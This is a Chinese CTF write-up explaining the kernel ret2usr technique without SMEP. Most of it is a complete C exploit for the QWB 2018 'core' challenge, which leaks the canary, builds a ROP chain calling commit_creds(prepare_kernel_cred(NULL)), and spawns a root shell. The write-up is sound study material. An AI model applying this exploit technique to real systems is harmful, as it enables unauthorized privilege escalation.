# Kernel ROP ret2usr

## ret2user with no SMEP

**在【未】开启SMAP/SMEP保护的情况下**，也就是启动脚本**没有添加参数`-cpu smep`**的情况下，用户空间无法访问内核空间的数据，但是内核空间可以访问用户空间的数据。

因此ret2usr with no SMEP，也就是可以通过kernel ROP以内核的ring 0权限执行用户空间的代码以完成提权。

### 0x00 原理

通常CTF中的ret2usr还是以执行`commit_creds(prepare_kernel_cred(NULL))`进行提权为主要的攻击手法，不过相比起构造冗长的ROP chain，ret2usr只需我们要提前在用户态程序构造好对应的函数指针、获取相应函数地址后直接执行即可。

>  对于开启了`SMAP/SMEP保护`的 kernel 而言，**内核空间尝试直接访问用户空间会引起kernel panic**

也就是直接在exploit中调用

```c
void ret2user(){
	void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}
```

### 0x01 例题

还是拿[kernel-rop1](/pwnable/220428-kernel-rop1)中的 强网杯2018 - core 举例子

> kernel确实没多少题目

具体的题目分析不写了，相比于正常rop，ret2user也就是可以直接在用户态自己写写个函数来调用`commit_creds(prepare_kernel_cred(NULL))`指令得到root权限。

```c
//  musl-gcc ./ret2user.c --static -masm='intel' -o ./exploit_ret2user

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

#define POP_RDI 0x000b2f;
#define POP_RDX 0x0a0f49;
#define POP_RCX 0x021e53;
#define MOV_RDI_RAX_CALL_RDX 0x01aa6a;
#define SWAPGS_POPFQ 0xa012da;
#define IRETQ 0x3eb448;


// commit_creds(prepare_kernel_cred(NULL))

size_t commit_creds = NULL;
size_t prepare_kernel_cred = NULL;
size_t user_cs,user_ss,user_rflags,user_sp;
// size_t vmlinux_base = 0;
void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("[*] Status has been saved.\n");
}

void core_read(int fd,char *buf){
    ioctl(fd,0x6677889B,buf);
}

void set_off(int fd,size_t off){
    ioctl(fd,0x6677889C,off);
}
void core_copy_func(int fd,size_t n){
    ioctl(fd,0x6677889A,n);
}
void get_shell(){
    if(!getuid()){
        printf("ROOT NOW!");
        system("/bin/sh");
    }else{
        printf("NO ROOT");
        exit(-1);
    }
}

void ret2user(){
	void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}


int main(){
    saveStatus();
    int fd = open("/proc/core",2);
    if(fd < 0){
        printf("cannot open '/proc/core' \n");
        exit(-1);
    }
    printf("[*]Open '/proc/core' ....\n");

    //get addr
    FILE * sys_table_fd = fopen("/tmp/kallsyms","r");
    if(sys_table_fd < 0){
        printf("cannot open '/tmp/kallsyms' \n");
        exit(-1);
    }
    printf("[*]Open '/tmp/kallsyms' ....\n");
    char buf[0x50]={0};
    while(fgets(buf,0x50,sys_table_fd)){
        if(commit_creds & prepare_kernel_cred)
            break;
        if(strstr(buf,"commit_creds") && !commit_creds){
            char hex[20]={0};
            strncpy(hex,buf,16);
            sscanf(hex,"%llx",&commit_creds);
            printf("[*]commit_creds addr: %p\n", commit_creds);
        }
        if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
            char hex[20]={0};
            strncpy(hex,buf,16);
            sscanf(hex,"%llx",&prepare_kernel_cred);
            printf("[*]prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
        }
    }

    /*
    [*] '/home/mark/Desktop/pwn/core/vmlinux'
    Arch:     amd64-64-little
    Version:  4.15.8
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0xffffffff81000000)
    RWX:      Has RWX segments
    commit_creds 0x9c8e0
    prepare_kernel_cred 0x09cce0
    */    

    size_t vmlinux_base = commit_creds - 0x9c8e0;
    printf("[*]vmlinux_base : %p\n",vmlinux_base);
    printf("[*]vmlinux_base : %p\n",prepare_kernel_cred - 0x09cce0);

    //get canary
    size_t canary;
    set_off(fd,64); //0x50-0x40
    char buf2[0x50]={0};
    core_read(fd,buf2);
    canary = ((size_t *)buf2)[0];
    printf("[*]Canary : %p\n",canary);

    //ROP
    size_t rop_chain[0x1000]={0};
    int i=0;
    for(;i<10;i++){
        rop_chain[i] = canary;
    }
    rop_chain[i++]=ret2user;

    // swapgs & iretq
    rop_chain[i++]=vmlinux_base + SWAPGS_POPFQ;
    rop_chain[i++]=0;
    rop_chain[i++]=vmlinux_base + IRETQ;

    // getshell
    rop_chain[i++]=(size_t)get_shell;
    rop_chain[i++] = user_cs;
    rop_chain[i++] = user_rflags;
    rop_chain[i++] = user_sp;
    rop_chain[i++] = user_ss;


    write(fd,rop_chain,0x100);
    core_copy_func(fd,0xffffffffffff0000 | (0x100)); // int16 == 0x300
    
    return 0;
}
```

最终提权成功

![](https://pic.imgdb.cn/item/626c089a239250f7c5cd6673.png)

